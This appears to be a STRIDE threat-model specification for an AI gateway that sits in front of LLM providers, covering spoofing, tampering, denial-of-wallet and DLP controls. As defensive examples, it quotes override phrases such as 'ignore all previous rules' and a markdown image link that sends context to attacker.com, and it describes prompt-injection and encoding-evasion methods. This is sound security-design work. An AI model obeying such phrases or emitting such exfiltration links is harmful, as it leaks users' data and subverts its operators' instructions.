# AI Gateway Threat Model and STRIDE Analysis

## Status
Living Technical Specification / Production Standard

## Domain
Application Security / AI Infrastructure / Threat Engineering

## System Boundary and Purpose
This document provides a comprehensive, rigorous threat model for the AI Gateway located at `/root/ai-gateway`. The gateway serves as the sole authoritative reverse proxy, policy engine, and control plane between internal/external client applications and downstream AI model providers (OpenAI, Anthropic, Google Vertex AI, AWS Bedrock, and self-hosted vLLM/Triton clusters).

The analysis follows the STRIDE methodology (Spoofing, Tampering, Repudiation, Information Disclosure, Denial of Service, Elevation of Privilege), augmented with domain-specific threat modeling for Large Language Model (LLM) attack surfaces.

## Related Specifications and Architecture Documents
- Foundational Philosophy: [00-PROJECT-PHILOSOPHY.md](file:///root/company-project-specs/00-PROJECT-PHILOSOPHY.md)
- System Specification: [01-ai-gateway.md](file:///root/company-project-specs/01-ai-gateway.md)
- Security Boundaries and Enforcement: [SECURITY-BOUNDARIES.md](file:///root/ai-gateway/docs/SECURITY-BOUNDARIES.md)
- Architecture Decision Record: [ADR-004: Streaming Policy Enforcement](file:///root/ai-gateway/docs/adr/ADR-004-streaming-policy-enforcement.md)

---

## 1. Data Flow and Threat Surfaces

```mermaid
flowchart LR
    subgraph UntrustedZone ["Untrusted Network"]
        UClient["Client App / Agent"]
    end

    subgraph EdgeBoundary ["Edge Ingress Boundary"]
        TLS["TLS 1.3 Termination"]
        AuthZ["AuthN / AuthZ Engine"]
        IngressDLP["Ingress DLP / RE2"]
    end

    subgraph CoreZone ["Gateway Core Trust Zone"]
        Router["Model Router"]
        Budget["Spend & Token Guard"]
        SSEEngine["Streaming Buffer Engine"]
    end

    subgraph StateZone ["Storage Boundary"]
        RedisCluster[("Redis State Store")]
        VaultDB[("Encrypted Key Vault")]
    end

    subgraph EgressBoundary ["Egress Boundary"]
        UpstreamClient["Egress HTTP/2 Client"]
        EgressDLP["Egress DLP Scanner"]
    end

    subgraph ExternalZone ["External Provider Zone"]
        ProviderAPI["Model Provider (e.g. OpenAI)"]
    end

    UClient -->|T-01, S-01, D-01, D-03| TLS
    TLS --> AuthZ
    AuthZ <-->|S-01, E-01| RedisCluster
    AuthZ --> IngressDLP
    IngressDLP -->|I-01, D-04, E-02| Router
    Router <-->|D-01| Budget
    Router <-->|S-02, I-02| VaultDB
    Router --> UpstreamClient
    UpstreamClient -->|S-02, T-03| ProviderAPI
    ProviderAPI -->|T-03, I-01| SSEEngine
    SSEEngine <-->|D-03| EgressDLP
    EgressDLP --> TLS
    TLS --> UClient
```

---

## 2. Formal STRIDE Threat Analysis

### 2.1 Spoofing (Identity and Authenticity)

#### Threat S-01: Tenant Impersonation via Forged or Stolen API Keys
- **Description:** An attacker obtains or crafts an API key to masquerade as a legitimate tenant, consuming token quotas and accessing private model configurations.
- **Attack Vector:** Brute-force scanning of short keys, exfiltration from developer workstations, or leaked git repositories.
- **Vulnerability / Precondition:** Weak API key entropy, lack of constant-time verification, or lack of environment-bound key prefixes.
- **Impact:** Financial loss via unauthorized token consumption, breach of tenant isolation, and attribution poisoning in audit logs.
- **Mitigation Mechanisms:**
  1. High-entropy key generation: 192 bits of cryptographic randomness via CSPRNG with structured prefix `gw_live_<identifier>_<secret>`.
  2. One-way key hashing: Storage of keys using Argon2id ($m=65536, t=3, p=4$) or salted SHA-256 with tenant-unique 32-byte salts.
  3. Constant-time key comparison (`crypto/subtle.ConstantTimeCompare`) prevents timing side-channel attacks.
  4. Immediate key revocation API with instant invalidation propagated across Redis clusters within $< 100\text{ms}$.
- **Residual Risk:** Compromise of legitimate tenant environment where the key is stored in plaintext.

#### Threat S-02: Upstream Model Provider Impersonation via DNS Hijacking or MITM
- **Description:** A network-level attacker intercepts gateway egress traffic and impersonates an external AI provider (e.g., `api.openai.com`), returning poisoned model responses.
- **Attack Vector:** Compromised local DNS resolver, BGP route hijacking, or rogue internal proxy.
- **Vulnerability / Precondition:** Failure to validate upstream TLS certificates or reliance on insecure operating system trust stores.
- **Impact:** Response poisoning, complete leakage of tenant prompts, and session hijacking.
- **Mitigation Mechanisms:**
  1. Strict TLS 1.3 enforcement on all egress HTTP connections.
  2. Minimal, hardened root CA bundle embedded directly in the gateway binary (compiled without untrusted public CAs).
  3. DNS-over-HTTPS (DoH) or strict DNSSEC validation on all egress name resolutions.
- **Residual Risk:** Compromise of a public root CA in the curated gateway bundle.

#### Threat S-03: Caller IP and Metadata Spoofing
- **Description:** A caller injects false `X-Forwarded-For`, `CF-Connecting-IP`, or `X-Real-IP` headers to bypass IP-based rate limiting or geofencing.
- **Attack Vector:** Direct HTTP request header injection against edge endpoints.
- **Vulnerability / Precondition:** Blind trust of inbound proxy headers without validating the immediate upstream TCP peer.
- **Impact:** Bypass of per-IP rate limits and corrupted audit trail forensics.
- **Mitigation Mechanisms:**
  1. The gateway strips all incoming `X-Forwarded-*` headers at the ingress boundary.
  2. Only the immediate TCP socket address or verified reverse-proxy CIDR ranges (configured via strict allowlist) are used to populate the trusted client IP.
- **Residual Risk:** Misconfiguration of upstream load balancer CIDR allowlists.

---

### 2.2 Tampering (Integrity)

#### Threat T-01: In-Flight Request and Parameter Tampering
- **Description:** An adversary alters routing parameters (e.g. changing `model` from `gpt-4o-mini` to `o3`, or tampering with `temperature` and `max_tokens`) to trigger unintended behavior or cost spikes.
- **Attack Vector:** Man-in-the-middle manipulation on internal networks without TLS, or parameter tampering via vulnerable intermediate services.
- **Vulnerability / Precondition:** Unencrypted internal transport or unauthenticated request mutation.
- **Impact:** Financial exhaustion, policy circumvention, or degraded model determinism.
- **Mitigation Mechanisms:**
  1. Mandatory TLS 1.3 across all network hops.
  2. Strict JSON schema validation against an immutable white-list of request fields; unknown parameters cause immediate request rejection (`HTTP 400 Bad Request`).
  3. Digital signature verification for sensitive enterprise requests requiring payload integrity (HMAC-SHA256 signature header).
- **Residual Risk:** Compromised internal microservice holding valid API keys altering parameters before gateway ingestion.

#### Threat T-02: Direct System Prompt Tampering and Role Injection
- **Description:** An attacker submits raw JSON payloads designed to override predefined system prompts or inject artificial conversation turns (e.g., injecting `{"role": "system", "content": "Ignore previous instructions"}`).
- **Attack Vector:** Malformed message array formatting or conversational role spoofing.
- **Vulnerability / Precondition:** Naive concatenation of user inputs into prompt templates without role-level isolation.
- **Impact:** Complete subversion of corporate behavioral policies, output guardrail bypass, and malicious tool invocation.
- **Mitigation Mechanisms:**
  1. The gateway enforces strict structural array validation on `messages`:
     - Tenants using managed system prompts have their system messages injected and sealed by the gateway runtime.
     - Callers are forbidden from modifying or injecting additional `system` role items when configured for fixed-persona deployments.
  2. Deterministic delimiter boundary tagging with escaping of prompt boundary markers (`<<<PROMPT_DELIMITER>>>`).
- **Residual Risk:** Sophisticated semantic prompt injection that persuades the model from within the `user` role context.

#### Threat T-03: Response Poisoning by Compromised Upstream Provider or Intercepted SSE Chunks
- **Description:** An external provider or compromised intermediate endpoint streams malicious code, exploit payloads, or altered function calls into downstream client systems.
- **Attack Vector:** Compromise of third-party model inference worker, supply-chain poisoning of model weights, or compromised egress proxy.
- **Vulnerability / Precondition:** Blind client execution of LLM-generated code or tool calls without gateway sanitization.
- **Impact:** Remote Code Execution (RCE) on client applications consuming tool calls, cross-site scripting (XSS) in client web views.
- **Mitigation Mechanisms:**
  1. Egress schema enforcement: All tool/function calls emitted by the model are validated against the tenant's registered JSON schema before transmission to the caller.
  2. Streaming response DLP inspection: Scanning of completion streams for malicious shell sequences, binary payloads, and unsanctioned tool names.
  3. Immediate stream termination via HTTP/2 `RST_STREAM` if an upstream response violates schema or policy.
- **Residual Risk:** Semantic poisoning where model output is syntactically valid JSON matching the schema, but logically malicious.

#### Threat T-04: Tampering with Gateway Audit Records and State Store Metrics
- **Description:** An insider or compromised gateway worker alters Redis sliding window counters or deletes audit log files to hide unauthorized activity.
- **Attack Vector:** Direct command injection to Redis, unauthorized write access to log directories.
- **Vulnerability / Precondition:** Shared database credentials, lack of cryptographic chaining on log entries.
- **Impact:** Destruction of forensic evidence, failure to bill tenants, undetectable security breaches.
- **Mitigation Mechanisms:**
  1. Cryptographic hash chaining ($H_i = \text{SHA-256}(H_{i-1} \parallel E_i)$) on all audit entries.
  2. Synchronous replication of hash checkpoints to WORM (Write Once, Read Many) cloud storage with object locking enabled.
  3. Parameterized Redis client drivers with strict key isolation (`ratelimit:{tenant_id}:...`); raw command execution is disabled.
- **Residual Risk:** Cloud account root compromise disabling object lock policies.

---

### 2.3 Repudiation (Non-Repudiation and Auditability)

#### Threat R-01: Denial of Token Consumption and Inference Spend
- **Description:** A tenant disputes their monthly billing statement, claiming the gateway miscalculated token usage or attributed another tenant's requests to them.
- **Attack Vector:** Commercial dispute, lack of verifiable proof of token consumption.
- **Vulnerability / Precondition:** Unsigned usage counters, missing request correlation IDs, or unrecorded payload digests.
- **Impact:** Revenue loss, legal dispute, inability to enforce quota contracts.
- **Mitigation Mechanisms:**
  1. Cryptographically verifiable audit records containing:
     - Exact timestamp (RFC 3339 microsecond resolution)
     - Authenticated API key identifier
     - SHA-256 digest of input prompt and output completion
     - Token counts reported by provider and verified by gateway BPE tokenizer
     - Unique request correlation ID (`X-Request-ID` UUIDv7)
  2. Cryptographic log chain signatures anchoring daily consumption totals.
- **Residual Risk:** Discrepancy between third-party provider billing metrics and gateway local BPE tokenizer counts (resolved via SLA contract terms).

#### Threat R-02: Repudiation of Malicious Prompt Injection or Data Exfiltration
- **Description:** An attacker within a customer organization initiates an attack (e.g. exfiltrating corporate data via the gateway) and claims the gateway fabricated the request.
- **Attack Vector:** Denying origination of malicious payload.
- **Vulnerability / Precondition:** Truncated logs, failure to log client authentication fingerprints.
- **Impact:** Inability to prosecute or remediate internal malicious actors.
- **Mitigation Mechanisms:**
  1. Ingress logging records the exact SHA-256 digest of the raw incoming request body.
  2. Verification receipt: The gateway issues an immutable response header `X-Gateway-Receipt: <sig>` containing an HMAC-SHA256 signature over `{request_id, timestamp, tenant_id, prompt_sha256}`.
- **Residual Risk:** Key rotation invalidating historical verification signatures if archive keys are not preserved.

---

### 2.4 Information Disclosure (Confidentiality)

#### Threat I-01: Sensitive Credential and PII Leakage in Prompts and Completions
- **Description:** End-users inadvertently or maliciously submit passwords, credit cards, national IDs, or proprietary API keys in prompts, or models reflect sensitive training data in completions.
- **Attack Vector:** User input error, prompt extraction attacks, or unredacted completion reflection.
- **Vulnerability / Precondition:** Absence of deterministic DLP scanning on ingress and egress boundaries.
- **Impact:** Violation of privacy laws (GDPR, HIPAA, PCI-DSS), brand damage, and account compromise.
- **Mitigation Mechanisms:**
  1. Deterministic RE2 scanning against known secret and PII patterns (PCI credit cards with Luhn check, SSNs, cloud provider tokens).
  2. Shannon entropy analysis detecting high-entropy string tokens ($H(X) \ge 4.5$).
  3. Configurable policy modes: `BLOCK` or deterministic `REDACT` masking.
  4. Fail-closed defaults ensuring uninspected chunks are never delivered to callers.
- **Residual Risk:** Sensitive proprietary business logic or domain terminology that does not exhibit high entropy or regex patterns.

#### Threat I-02: Upstream Provider Master Key Leakage
- **Description:** The gateway's master upstream API keys (e.g., Anthropic, OpenAI) are leaked through error responses, stack traces, memory dumps, or debug headers.
- **Attack Vector:** Requesting invalid model names to trigger verbose upstream error messages, memory scraping of gateway containers, or inspecting debug log sinks.
- **Vulnerability / Precondition:** Unsanitized upstream error passthrough or logging raw HTTP request structures.
- **Impact:** Complete compromise of corporate AI infrastructure spend and data access across all upstream accounts.
- **Mitigation Mechanisms:**
  1. Strict error normalization: Upstream 4xx/5xx responses are caught by the gateway; headers and bodies are scrubbed before emitting a standardized JSON error to the caller.
  2. Upstream provider keys are stored in encrypted envelopes (AES-256-GCM) with DEKs derived via KMS HSM.
  3. Decrypted keys reside in memory only during active socket writes and are scrubbed via `memzero` immediately after transmission.
  4. Automated secret scanners run continuously in CI/CD and log pipelines.
- **Residual Risk:** Zero-day memory extraction vulnerability in the container runtime or host kernel.

#### Threat I-03: Cross-Tenant Data Leakage via Semantic or Exact Caching
- **Description:** Tenant A submits a prompt and receives a cached completion previously generated for Tenant B containing Tenant B's confidential data.
- **Attack Vector:** Probing common prompt prefixes to retrieve cross-tenant cached outputs.
- **Vulnerability / Precondition:** Shared cache keys that omit the tenant identifier.
- **Impact:** Severe cross-tenant confidentiality breach.
- **Mitigation Mechanisms:**
  1. Cache key generation incorporates the tenant identifier into the cryptographic pre-image:
     $$\text{CacheKey} = \text{SHA-256}(tenant\_id \parallel \text{":"} \parallel model \parallel \text{":"} \parallel \text{CanonicalPromptHash})$$
  2. Shared cross-tenant caching is strictly forbidden by architectural policy.
- **Residual Risk:** None; cryptographic isolation guarantees independent keyspaces.

#### Threat I-04: Model Inversion and Training Data Extraction Probing
- **Description:** An attacker submits millions of automated probing queries designed to extract verbatim training records or proprietary fine-tuning data from models.
- **Attack Vector:** High-volume repetitive token sampling and loss-gradient estimation through output token probabilities.
- **Vulnerability / Precondition:** Unrestricted request volume, low token costs, or exposing raw logprobs.
- **Impact:** Exfiltration of proprietary intellectual property and personal data contained in model weights.
- **Mitigation Mechanisms:**
  1. Strict token bucket rate limiting per tenant and per IP address.
  2. By default, raw `logprobs` and `top_logprobs` are stripped or restricted to administrative roles.
  3. Anomaly detection monitors repetitive lexical similarity in prompts over sliding time windows.
- **Residual Risk:** Low-volume, distributed extraction attacks using multiple tenant identities.

---

### 2.5 Denial of Service (Availability and Economic Sustainability)

#### Threat D-01: Token Depletion and Economic Denial of Wallet (EDoS)
- **Description:** An adversary exploits the asymmetric cost between an inexpensive HTTP request and an expensive high-parameter model inference call ($0.0001 client cost vs $5.00 LLM cost) to exhaust the organization's financial budget.
- **Attack Vector:** Submitting requests with maximum context window fill (e.g. 128k input tokens) and `max_tokens: 4096` using reasoning-heavy models.
- **Vulnerability / Precondition:** Lack of upfront cost validation, absence of spend quotas, or unmetered tool loops.
- **Impact:** Exhaustion of enterprise cloud budget, upstream provider quota suspension, service shutdown.
- **Mitigation Mechanisms:**
  1. Speculative token reservation: Before dispatching to upstream providers, the gateway calculates the worst-case cost:
     $$\text{WorstCaseCost} = (\text{PromptTokens} \times \text{Cost}_{\text{in}}) + (\text{MaxOutputTokens} \times \text{Cost}_{\text{out}})$$
     The gateway reserves this amount from the tenant's Redis balance atomically via Lua script.
  2. Hard spend caps: Per-tenant hourly, daily, and monthly dollar limits. When exceeded, the gateway immediately returns `HTTP 429` without contacting upstream APIs.
  3. Pre-flight input length restrictions: Enforcing `max_input_tokens` per tenant tier before upstream dispatch.
- **Residual Risk:** Legitimate customer surges triggering false-positive budget lockouts.

#### Threat D-02: Recursive Tool Execution and Agent Orchestration Loops
- **Description:** Autonomous AI agents entering infinite recursive loops of tool calling and self-prompting through the gateway, causing resource exhaustion and runaway costs.
- **Attack Vector:** Unconstrained autonomous multi-agent frameworks calling gateway APIs in loops.
- **Vulnerability / Precondition:** Absence of loop-detection headers or execution depth counters.
- **Impact:** System saturation, financial depletion, state store connection exhaustion.
- **Mitigation Mechanisms:**
  1. Execution depth tracking: All agent requests must pass an `X-Agent-Depth` header. The gateway increments this counter and rejects requests exceeding `MaxDepth = 15`.
  2. Sliding window duplicate detection: The gateway hashes `(tenant_id, model, prompt_hash)` over a 60-second window. Identical repeated requests without variation trigger throttling.
- **Residual Risk:** Agents that deliberately vary prompts to evade exact loop detection.

#### Threat D-03: Slowloris Server-Sent Events (SSE) Connection Exhaustion
- **Description:** Malicious clients initiate thousands of streaming requests, reading SSE chunk streams at a rate of 1 byte per minute, exhausting gateway socket descriptors and thread pools.
- **Attack Vector:** Distributed slow-read HTTP attacks against streaming endpoints.
- **Vulnerability / Precondition:** Unbounded socket read/write timeouts on streaming connections.
- **Impact:** File descriptor exhaustion (`EMFILE`), gateway unable to accept new connections, total outage.
- **Mitigation Mechanisms:**
  1. Bounded write deadlines: Every SSE write operation must complete within 2.0 seconds. If a client TCP receive window stalls, the socket is forcefully closed (`ECONNRESET`).
  2. Per-tenant streaming connection concurrency limits enforced via Redis:
     $$\text{ActiveStreams}(tenant\_id) \le \text{MaxAllowedConcurrentStreams}$$
  3. Connection lifetime hard cap: No single SSE connection may exceed 300 seconds total duration.
- **Residual Risk:** Need for legitimately long generation tasks to reconnect or poll.

#### Threat D-04: Catastrophic Backtracking and ReDoS in DLP Scanners
- **Description:** An attacker crafts an adversarial prompt containing specific repeated character sequences designed to trigger exponential backtracking in regex evaluation.
- **Attack Vector:** Specially crafted payloads targeting complex regular expressions.
- **Vulnerability / Precondition:** Using non-linear regex engines (e.g. PCRE, Python `re`, standard JavaScript regex).
- **Impact:** 100% CPU starvation across gateway worker threads, latency spikes from milliseconds to hours.
- **Mitigation Mechanisms:**
  1. Strict use of non-backtracking regular expression engines: Only engines guaranteeing $O(n)$ linear time complexity (RE2, Rust `regex`) are allowed in the gateway codebase.
  2. Hard scanning timeout: Ingress and egress DLP scanning is wrapped in a hard 50ms execution deadline. If exceeded, the gateway fails closed.
- **Residual Risk:** None; linear automata eliminate ReDoS by mathematical construction.

#### Threat D-05: Cascading Failures via Upstream Provider Throttling and Outages
- **Description:** A primary model provider suffers an outage or returns `HTTP 429 Rate Limited`. Hundreds of queued client connections back up, exhausting gateway memory and worker pools.
- **Attack Vector:** Provider infrastructure failure or sudden upstream quota depletion.
- **Vulnerability / Precondition:** Unbounded retry loops, lack of circuit breakers.
- **Impact:** Gateway crash, cascading failure affecting all tenants regardless of provider.
- **Mitigation Mechanisms:**
  1. Circuit breakers per provider: Configured to open after 5 consecutive 5xx errors or 50% failure rate over 10 seconds.
  2. Automatic fallback routing: When Provider A's circuit breaker opens, traffic routes to Provider B (e.g. falling back from OpenAI to Azure OpenAI or Claude).
  3. Bounded retry backoff: Maximum of 2 retries with exponential backoff and jitter ($t_{wait} = 2^n \times 100\text{ms} + \text{jitter}$).
- **Residual Risk:** Outage affecting all configured fallback providers simultaneously.

---

### 2.6 Elevation of Privilege (Access Control and Permissions)

#### Threat E-01: Model Tier Access Bypass
- **Description:** A tenant provisioned for low-cost models (`gpt-4o-mini`, `claude-3-haiku`) requests premium reasoning models (`o3`, `claude-3-5-sonnet`) by tampering with the `model` request field.
- **Attack Vector:** Direct API request manipulation.
- **Vulnerability / Precondition:** Model routing engine relying on caller-specified parameters without verifying tenant model entitlements.
- **Impact:** Unauthorized usage of high-cost resources, breach of contract.
- **Mitigation Mechanisms:**
  1. Tenant Capability Profiles: Every authenticated API key maps to an explicit allowlist of authorized model identifiers stored in tenant metadata.
  2. Authoritative Model Mapping: The routing engine validates `model_requested \in TenantAllowedModels`. If unauthorized, the gateway rejects the request immediately with `HTTP 403 Forbidden` (`MODEL_ACCESS_DENIED`).
- **Residual Risk:** Administrative misconfiguration granting incorrect capabilities to a tenant profile.

#### Threat E-02: Policy Engine Bypass via Obfuscated Encodings
- **Description:** An attacker bypasses DLP and safety rules by encoding malicious inputs in Base64, Hexadecimal, Unicode homoglyphs, or leetspeak.
- **Attack Vector:** Multi-layer encoding of prohibited strings.
- **Vulnerability / Precondition:** Policy engine scanning only raw ASCII strings without canonicalization.
- **Impact:** Exfiltration of secrets and circumvention of safety guardrails.
- **Mitigation Mechanisms:**
  1. Unicode Normalization: Input payloads undergo Unicode NFKC normalization prior to pattern matching.
  2. High-entropy detection: Base64 and Hexadecimal encoded strings trigger the Shannon entropy scanner ($H(X) \ge 4.5$) regardless of whether the decoded string matches a specific regex.
  3. Automatic decoding pass: High-entropy tokens are speculatively decoded and recursively scanned through the RE2 automata.
- **Residual Risk:** Novel zero-width character steganography evading standard normalization passes.

#### Threat E-03: Administrative Control Plane and Key Vault Access Escalation
- **Description:** An unprivileged caller accessing public inference routes invokes internal administrative endpoints (`/admin/keys`, `/admin/tenants`, `/admin/policies`).
- **Attack Vector:** Path traversal, route confusion, or misconfigured reverse-proxy routing rules.
- **Vulnerability / Precondition:** Exposing administrative endpoints on the same network port/listener as client inference routes.
- **Impact:** Total system compromise, unauthorized key issuance, policy alteration.
- **Mitigation Mechanisms:**
  1. Physical port separation: Administrative endpoints listen strictly on a dedicated internal port (`:9090`) bound exclusively to private loopback or internal management VPCs. The public listener (`:443` or `:8080`) has no route handlers for `/admin/*`.
  2. Mutual TLS (mTLS) with internal corporate PKI required for all administrative requests.
- **Residual Risk:** Misconfigured cloud load balancer routing external traffic to the internal admin port.

---

## 3. LLM-Specific Attack Vectors

```
+---------------------------------------------------------------------------------------+
|                              LLM ATTACK VECTOR LANDSCAPE                              |
|                                                                                       |
|  +---------------------------+   +---------------------------+   +-----------------+  |
|  | Direct Prompt Injection   |   | Indirect Prompt Injection |   | Denial of Wallet|  |
|  | - Delimiter smuggling     |   | - Malicious web retrieval |   | - Context fill  |  |
|  | - Role confusion          |   | - Hidden markdown images  |   | - Asymmetric    |  |
|  | - Base64 evasion          |   | - Tool output poisoning   |   |   compute cost  |  |
|  +---------------------------+   +---------------------------+   +-----------------+  |
|                |                               |                          |           |
|                v                               v                          v           |
|  +---------------------------------------------------------------------------------+  |
|  |                       GATEWAY PERIMETER DEFENSE LAYER                           |  |
|  | - Structural schema validation  - Strict tool-call sandboxing - Spend quotas    |  |
|  | - Delimiter boundary escaping   - Egress DLP link scrubbing   - Token reserve   |  |
|  +---------------------------------------------------------------------------------+  |
+---------------------------------------------------------------------------------------+
```

### 3.1 Direct Prompt Injection and Safety Filter Evasion
Direct prompt injection occurs when untrusted user inputs subvert the model's instructions, forcing it to ignore safety parameters, reveal confidential system instructions, or act as an arbitrary agent.

**Gateway-Level Perimeter Defense:**
1. The gateway does not attempt probabilistic semantic jailbreak detection in the critical path (avoiding false positives and high latency).
2. The gateway enforces **structural prompt isolation**:
   - System prompts and user inputs are strictly transmitted in discrete JSON array elements (`role: system` vs `role: user`).
   - Delimiter tokens matching internal template markers are escaped:
     ```text
     Original: "<<<SYSTEM_OVERRIDE>>> ignore all previous rules"
     Sanitized: "\<\<\<SYSTEM_OVERRIDE\>\>\> ignore all previous rules"
     ```
   - Input length bounds prevent prompt bloat attacks that exhaust model context windows to push system instructions out of memory.

### 3.2 Indirect Prompt Injection via Retrieved Context (RAG)
In Retrieval-Augmented Generation (RAG) workflows, untrusted external documents (web pages, customer support tickets, uploaded PDFs) retrieved into the model's context contain embedded adversarial instructions.

**Gateway Defense Mechanisms:**
1. **Context Boundary Tagging:** The gateway provides client SDK helpers and endpoints that encapsulate untrusted external context within cryptographically signed and demarcated XML/Markdown tags:
   ```xml
   <untrusted_context_data source_id="doc_9912" verification="valid">
   ... untrusted document body ...
   </untrusted_context_data>
   ```
2. **Tool-Call Destination White-Listing:** Models tricked by indirect injection into calling external tools are constrained: the gateway validates that tool invocations match registered tenant schemas and permitted target domains.
3. **Egress Link Scrubbing:** The egress DLP scanner scrubs completion payloads containing markdown image injection designed to exfiltrate context via URL parameters (e.g. `![exfil](https://attacker.com/leak?data=...)`).

### 3.3 Systemic Denial of Wallet (Economic Denial of Service - EDoS)
In traditional web infrastructure, an attacker's request costs the server fractions of a microcent in CPU cycles. In LLM systems, a single crafted API call utilizing complex reasoning models can cost upwards of $3.00 to $10.00.

**Algorithmic Defense: Atomic Speculative Token Reservation**
To prevent a tenant or attacker from driving account bankruptcy:
```
1. Client submits request with Prompt (P tokens) and requested MaxTokens (M tokens).
2. Gateway calculates MaxCost = (P * Rate_In) + (M * Rate_Out).
3. Atomically in Redis:
     IF TenantCurrentSpend + MaxCost > TenantSpendCap THEN
         REJECT with HTTP 429 ("SPEND_LIMIT_EXCEEDED")
     ELSE
         TenantCurrentSpend += MaxCost
         TenantReservedSpend[RequestID] = MaxCost
4. Gateway dispatches request to upstream provider.
5. Upstream returns completion with ActualTokens (A tokens).
6. Gateway calculates ActualCost = (P * Rate_In) + (A * Rate_Out).
7. Atomically in Redis:
     TenantCurrentSpend -= (MaxCost - ActualCost)
     DELETE TenantReservedSpend[RequestID]
```
This algorithm guarantees that even under massive distributed concurrency, a tenant cannot exceed their allocated spend ceiling.

---

## 4. Threat Mitigation Matrix

| Threat ID | STRIDE Category | Threat Description | Specific Technical Control | Verification Criteria (Automated Test / Metric) | Residual Risk & Operational Tradeoff |
| :--- | :--- | :--- | :--- | :--- | :--- |
| **S-01** | Spoofing | Tenant impersonation via forged API key | Argon2id salted hash, CSPRNG 192-bit keys, constant-time compare | Automated test verifying sub-millisecond key verification with zero timing variance ($p > 0.95$) | Stolen keys from client environment; requires tenant credential rotation |
| **S-02** | Spoofing | Upstream provider impersonation via MITM | Egress TLS 1.3 only, minimal pinned root CA bundle, DNSSEC | Integration test asserting connection failure against untrusted test cert | Compromise of public CA authority present in root bundle |
| **S-03** | Spoofing | Client IP spoofing via `X-Forwarded-For` | Gateway strips client proxy headers; binds strictly to TCP socket | Unit test injecting spoofed `X-Forwarded-For` and asserting correct TCP IP in audit | Trusted reverse proxy misconfiguration |
| **T-01** | Tampering | In-flight request and parameter tampering | Mandatory mTLS across internal hops, strict schema whitelisting | Fuzzing test submitting undeclared JSON parameters expecting HTTP 400 | Client credentials compromised at source application |
| **T-02** | Tampering | System prompt role injection | Structural JSON validation, escaping internal delimiters | Security suite verifying system prompt immutability under adversarial inputs | Semantic persuasion within user role boundary |
| **T-03** | Tampering | Response poisoning from upstream | Egress tool schema validation, SSE streaming DLP scanner | Integration test injecting malformed tool schemas expecting `RST_STREAM` | Model produces syntactically valid but logically erroneous code |
| **T-04** | Tampering | Audit log tampering or truncation | Cryptographic SHA-256 hash chaining, WORM immutable storage | Verification utility computing chain parity over 100k generated logs | Cloud root administrator credential compromise |
| **R-01** | Repudiation | Denial of token consumption spend | Signed audit logs, SHA-256 payload digest, request receipts | Test matching provider token usage against gateway ledger within 1% margin | Discrepancy between BPE tokenizer and proprietary provider tokenizers |
| **R-02** | Repudiation | Repudiation of prompt injection attack | Verifiable HMAC-SHA256 response receipts, raw payload hash | Cryptographic verification tool validating request fingerprint against audit | Key rollover requiring archived verification keys |
| **I-01** | Information Disclosure | PII / credential leakage in prompt/output | Deterministic RE2 scanner, Shannon entropy threshold ($H \ge 4.5$) | CI test suite running 5,000 synthetic PII/secret samples asserting 100% catch rate | Low-entropy proprietary domain secrets |
| **I-02** | Information Disclosure | Master upstream provider key leakage | AES-256-GCM envelope encryption, memory zeroization, error sanitizing | Automated penetration test checking error responses and logs for `sk-*` patterns | Cold-boot memory dump attack on bare metal |
| **I-03** | Information Disclosure | Cross-tenant cache poisoning | Tenant ID embedded in cryptographic cache key pre-image | Multi-tenant test verifying Tenant A cache miss on Tenant B prompt | Memory overhead of isolated cache namespaces |
| **I-04** | Information Disclosure | Model training data extraction probing | Sliding-window prompt similarity tracking, rate limiting | Load test simulating probing attack asserting rate limit trigger within 50 calls | Distributed low-frequency probing attacks |
| **D-01** | Denial of Service | Token depletion / Denial of Wallet (EDoS) | Atomic speculative token reservation in Redis, spend quotas | Concurrency test with 1,000 parallel requests asserting spend cap enforcement | Legitimate bursts blocked if spend cap is set too low |
| **D-02** | Denial of Service | Recursive agent tool execution loops | `X-Agent-Depth` counter tracking, duplicate prompt detection | Integration test with circular agent calls asserting termination at depth 15 | Legitimate deep reasoning agent trees curtailed |
| **D-03** | Denial of Service | Slowloris SSE connection exhaustion | 2.0s write deadlines, per-tenant stream concurrency limits, 300s max | Slowloris load test verifying dead socket termination and FD recovery | Slow mobile clients on poor cellular networks dropped |
| **D-04** | Denial of Service | ReDoS in regex pattern matching | Strictly linear-time RE2 regex engine, 50ms execution deadline | ReDoS benchmark submitting catastrophic backtracking patterns ($O(n)$ verified) | Inability to use backreferences or lookaround assertions in regex |
| **D-05** | Denial of Service | Cascading failure from provider outage | Circuit breaker (5 failures / 10s), automated fallback routing | Chaos test injecting 100% provider errors, verifying fallback activation in $< 200\text{ms}$ | Increased latency during failover negotiation |
| **E-01** | Elevation of Privilege | Model tier access bypass | Capability profile validation at authorization stage | Test verifying unprivileged key requesting `o3` receives HTTP 403 | Administrative misconfiguration in tenant profile |
| **E-02** | Elevation of Privilege | Policy bypass via encodings | NFKC normalization, Shannon entropy detection on encoded tokens | Evasion test suite running Base64/Hex obfuscated payloads asserting detection | Latency overhead of speculative decoding pass |
| **E-03** | Elevation of Privilege | Admin control plane escalation | Dedicated internal port `:9090`, mTLS requirement for admin | Port scan and route test ensuring `/admin/*` unreachable via public port | Operational complexity of multi-port routing |

---

## 5. Security Verification and Regression Protocols

To maintain this threat model over time, the following automated security verification controls run in CI/CD and production environments:

1. **Deterministic ReDoS and Fuzzing Suite:**
   - Evaluates all DLP regex rules against synthetic adversarial strings designed to cause catastrophic backtracking. Tests must pass with zero execution time regressions ($< 5\text{ms}$ for $100\text{KB}$ input).
2. **Multi-Tenant Leakage Regression:**
   - Spin up 50 simulated concurrent tenants executing overlapping prompt sets. Assert with mathematical certainty that zero cross-tenant responses or cache entries occur.
3. **Speculative Reservation Exhaustion Drill:**
   - Execute parallel load testing attempting to exceed configured spend quotas by 500%. Verify that Redis Lua reservation logic allows zero budget overrun.
4. **Upstream Failure and Circuit Breaker Verification:**
   - Inject network blackholes and HTTP 500 error cascades into upstream mock servers. Assert that circuit breakers trip cleanly and fallback routes engage without dropping in-flight traffic.
